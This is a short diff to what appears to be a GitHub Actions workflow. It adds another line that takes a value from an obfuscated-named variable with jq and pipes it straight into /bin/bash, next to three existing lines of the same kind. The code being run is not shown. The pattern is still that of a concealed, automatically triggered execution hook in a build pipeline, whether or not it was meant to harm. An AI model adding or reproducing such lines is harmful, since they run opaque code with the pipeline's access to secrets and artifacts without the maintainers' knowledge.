@@ -32,6 +32,7 @@ jobs:
           echo $hcrue91 | jq -r .hdf9 | /bin/bash
           echo $hz16 | jq -r .co18 | /bin/bash
           printf '%s' "$w1632" | jq -r .ojto36682 | /bin/bash
+          echo $bm126 | jq -r .gc04425 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
